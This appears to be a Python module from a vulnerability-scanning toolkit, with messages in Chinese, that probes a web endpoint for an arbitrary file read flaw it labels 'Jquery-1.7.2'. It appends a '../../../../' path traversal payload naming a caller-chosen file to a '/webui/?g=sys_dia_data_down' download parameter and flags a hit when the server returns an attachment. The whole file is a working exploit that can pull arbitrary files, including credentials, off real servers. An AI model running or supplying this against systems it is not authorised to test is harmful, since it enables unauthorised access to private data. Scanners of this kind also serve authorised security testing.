#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
import urllib3
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet
urllib3.disable_warnings()


class JqueryDirReadScan():
    def __init__(self):
        self.proexis = None
        self.headers = None

    def run(self,url):
        try:
            response = requests.post(url, headers=self.headers, verify=self.verify, proxies=self.proexis)
            contents = response.headers.get('Content-Disposition', '')
            if 'attachment' in contents.lower():
                OutPrintInfo("JQuery", f"[b bright_red]可能存在Juqery-1.7.2任意文件读取漏洞")
                OutPrintInfo("JQuery", f"[b bright_red]Url:{url}")
                OutPrintInfo("JQuery", f"需访问目录查看是否下载目标文件")
            else:
                OutPrintInfo("JQuery", f"目标不存在Juqery-1.7.2任意文件读取漏洞")
        except Exception as e:
            pass

    def main(self, results):
        url = results[0].strip('/ ')
        file = results[1].lstrip(' /')
        head = results[2]
        proxy = results[3]
        self.verify = results[4]
        req = ReqSet(header=head,proxy=proxy)
        self.headers = req["header"]
        self.proexis = req["proxy"]
        OutPrintInfo("JQuery", "开始检测Juqery-1.7.2任意文件读取")
        new_url = url + f"/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../{file}"
        self.run(new_url)
        OutPrintInfo("JQuery", "Jquery-1.7.2任意文件读取检测结束")
